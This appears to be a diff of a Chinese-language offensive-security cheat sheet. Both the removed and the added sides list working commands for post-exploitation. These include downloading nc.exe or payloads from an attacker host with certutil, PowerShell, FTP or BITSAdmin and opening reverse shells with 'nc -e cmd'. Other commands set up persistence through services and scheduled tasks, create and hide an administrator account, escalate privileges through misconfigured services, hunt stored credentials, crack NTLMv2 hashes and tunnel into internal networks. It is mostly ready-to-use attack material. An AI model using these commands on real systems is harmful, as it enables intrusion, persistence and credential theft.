-<h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#x27;Microsoft-Windows-Power-TroubleShooter&#x27;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#x27;Sleep&#x27;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#x27;Wake&#x27;;e=&#123;$_.Properties[1].Value&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">TFTP Linux: <span class="built_in">cat</span> /etc/default/atftpd to find out file serving location; default <span class="keyword">in</span> kali /srv/tftp</span></span><br><span class="line">service atftpd start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">tftp -i $ATTACKER get /download/location/file /save/location/file</span><br></pre></td></tr></table></figure>
-<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux: <span class="built_in">set</span> up ftp server with anonymous logon access;</span></span><br><span class="line">twistd -n ftp -p 21 -r /file/to/serve</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows shell: <span class="built_in">read</span> FTP commands from ftp-commands.txt non-interactively;</span></span><br><span class="line">echo open $ATTACKER&gt;ftp-commands.txt</span><br><span class="line">echo anonymous&gt;&gt;ftp-commands.txt</span><br><span class="line">echo whatever&gt;&gt;ftp-commands.txt</span><br><span class="line">echo binary&gt;&gt;ftp-commands.txt</span><br><span class="line">echo get file.exe&gt;&gt;ftp-commands.txt</span><br><span class="line">echo bye&gt;&gt;ftp-commands.txt </span><br><span class="line">ftp -s:ftp-commands.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Or just a one-liner</span></span><br><span class="line">(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</span><br></pre></td></tr></table></figure>
-<h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</span><br></pre></td></tr></table></figure>
-<h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#x27;http://10.11.0.245/nc.exe&#x27;, &#x27;C:\\Temp\\nc.exe&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/nc.exe&#x27;,&#x27;nc.exe&#x27;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;</span><br><span class="line">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/nc.exe&#x27;,&#x27;nc.exe&#x27;); Start-Process nc.exe -NoNewWindow -Argumentlist &#x27;$ATTACKER 4444 -e cmd.exe&#x27;&quot; &#125;</span><br><span class="line">powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/nc.exe&#x27;,&#x27;nc.exe&#x27;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#x27;$ATTACKER 4444 -e cmd.exe&#x27;&quot;</span><br><span class="line">powershell (New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/file.exe&#x27;,&#x27;file.exe&#x27;);(New-Object -com Shell.Application).ShellExecute(&#x27;file.exe&#x27;);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">download using default proxy credentials and launch</span></span><br><span class="line">powershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#x27;$ATTACKER 4444 -e cmd.exe&#x27;&quot; &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</span><br></pre></td></tr></table></figure>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://$ATTACKER/file</span><br><span class="line">curl http://$ATTACKER/file -O</span><br><span class="line">scp ~/file/file.bin user@$TARGET:tmp/backdoor.py</span><br></pre></td></tr></table></figure>
-<h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attacker</span></span><br><span class="line">nc -l -p 4444 &lt; /tool/file.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Victim</span></span><br><span class="line">nc $ATTACKER 4444 &gt; file.exe</span><br></pre></td></tr></table></figure>
-<h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. In Linux, convert binary to hex ascii:</span></span><br><span class="line">wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. Paste nc.txt into Windows Shell.</span></span><br></pre></td></tr></table></figure>
-<h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</span><br></pre></td></tr></table></figure>
+# crack with hashcat
+hashcat -m5600 &#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
+</code></pre>
+<h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><pre><code class="shell">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
+</code></pre>
+<h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><pre><code class="powershell">$a = Get-ChildItem &quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue
+$a | % &#123;
+    $fileName = $_.fullname
+    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? &#123;$_.filesystemrights -match &quot;full|modify|write&quot; -and $_.identityreference -match &quot;authenticated users|everyone|$env:username&quot;&#125;
+    if($acls -ne $null)
+    &#123;
+        [pscustomobject]@&#123;
+            filename = $fileName
+            user = $acls | select -exp identityreference
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><pre><code class="shell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+</code></pre>
+<h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><pre><code class="powershell">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; ID=4104&#125; | Select-Object -Property Message | Select-String -Pattern &#39;SecureString&#39;
+</code></pre>
+<h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><pre><code class="pwoershell">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#39;Microsoft-Windows-Power-TroubleShooter&#39;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#39;Sleep&#39;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#39;Wake&#39;;e=&#123;$_.Properties[1].Value&#125;&#125;
+</code></pre>
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><pre><code class="shell">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
+service atftpd start
+# Windows
+tftp -i $ATTACKER get /download/location/file /save/location/file
+</code></pre>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre><code class="shell"># Linux: set up ftp server with anonymous logon access;
+twistd -n ftp -p 21 -r /file/to/serve
 
-<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cmd</span></span><br><span class="line">sc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">powersehll</span></span><br><span class="line">New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#x27;C:\Program Files\NotEvil\back.exe&#x27;&quot; -Description &quot;Not at all&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Launch evil.exe every 10 minutes</span></span><br><span class="line">schtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</span><br></pre></td></tr></table></figure>
-<h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</span><br></pre></td></tr></table></figure>
-<h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f</span><br></pre></td></tr></table></figure>
-<h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Look <span class="keyword">for</span> SERVICE_ALL_ACCESS <span class="keyword">in</span> the output</span></span><br><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line"></span><br><span class="line">sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">sc qc [service_name] (to verify!)</span><br><span class="line">sc start [service_name]</span><br></pre></td></tr></table></figure>
-<h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /A:H /s &quot;c:\program files&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls.exe C:\folder /findsid userName-or-*sid /t</span><br><span class="line">//look for (F)ull, (M)odify, (W)rite</span><br></pre></td></tr></table></figure>
-<h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">c:\unattend.xml</span><br><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">dir c:\*vnc.ini /s /b</span><br><span class="line">dir c:\*ultravnc.ini /s /b </span><br><span class="line">dir c:\ /s /b | findstr /si *vnc.ini</span><br><span class="line"></span><br><span class="line">findstr /si password *.txt | *.xml | *.ini</span><br><span class="line">findstr /si pass *.txt | *.xml | *.ini</span><br><span class="line">dir /s *cred* == *pass* == *.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Autologon</span></span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VNC</span></span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Putty</span></span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Registry</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s </span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
-<h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires PSRemoting</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">username = <span class="string">&#x27;Administrator&#x27;</span>;<span class="variable">$password</span> = <span class="string">&#x27;1234test&#x27;</span>;<span class="variable">$securePassword</span> = ConvertTo-SecureString <span class="variable">$password</span> -AsPlainText -Force;<span class="variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;Invoke-Command -Credential <span class="variable">$credential</span> -ComputerName COMPUTER_NAME -Command &#123; <span class="built_in">whoami</span> &#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">without PSRemoting</span></span><br><span class="line"><span class="meta prompt_">cmd&gt; </span><span class="language-bash">powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential <span class="string">&#x27;username&#x27;</span>, (ConvertTo-SecureString <span class="string">&#x27;password&#x27;</span> -AsPlainText -Force))</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">without PS Remoting, with arguments</span></span><br><span class="line"><span class="meta prompt_">cmd&gt; </span><span class="language-bash">powershell -<span class="built_in">command</span> <span class="string">&quot;start-process cmd.exe -argumentlist &#x27;/c calc&#x27; -Credential (New-Object System.Management.Automation.PSCredential &#x27;username&#x27;,(ConvertTo-SecureString &#x27;password&#x27; -AsPlainText -Force))&quot;</span></span></span><br></pre></td></tr></table></figure>
-<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires interactive console</span></span><br><span class="line">runas /user:userName cmd.exe</span><br></pre></td></tr></table></figure>
-<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</span><br></pre></td></tr></table></figure>
-<h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</span><br></pre></td></tr></table></figure>
-<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Listen on <span class="built_in">local</span> port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: access a host that<span class="string">&#x27;s being blocked by a firewall via SSH_SERVER;</span></span></span><br><span class="line">ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</span><br></pre></td></tr></table></figure>
-<h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Listen on <span class="built_in">local</span> port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;</span></span><br><span class="line">ssh -D 127.0.0.1:8080 user@SSH_SERVER</span><br></pre></td></tr></table></figure>
-<h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: expose RDP on non-routable network;</span></span><br><span class="line">ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER</span><br><span class="line">plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</span><br></pre></td></tr></table></figure>
-<h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open a <span class="built_in">local</span> port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: a remote host has SSH running, but it<span class="string">&#x27;s only bound to 127.0.0.1, but you want to reach it;</span></span></span><br><span class="line">proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555</span><br><span class="line">ssh user@127.0.0.1 -p 5555</span><br></pre></td></tr></table></figure>
-<h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22</span></span><br><span class="line">hts -F localhost:22 80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80</span></span><br><span class="line">htc -F 8080 192.168.1.15:80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22</span></span><br><span class="line">ssh localhost -p 8080</span><br></pre></td></tr></table></figure>
-<h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加一个IPV4到IPV4的端口映射</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">指定监听ip和端口可以删除</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看存在的转发</span></span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
+echo open $ATTACKER&gt;ftp-commands.txt
+echo anonymous&gt;&gt;ftp-commands.txt
+echo whatever&gt;&gt;ftp-commands.txt
+echo binary&gt;&gt;ftp-commands.txt
+echo get file.exe&gt;&gt;ftp-commands.txt
+echo bye&gt;&gt;ftp-commands.txt 
+ftp -s:ftp-commands.txt
 
+# Or just a one-liner
+(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd
+</code></pre>
+<h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><pre><code class="shell">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+</code></pre>
+<h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:\\Temp\\nc.exe&#39;)&quot;
+</code></pre>
+<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code class="shell">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;
+powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;
+powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;
+powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);
+
+# download using default proxy credentials and launch
+powershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;
+</code></pre>
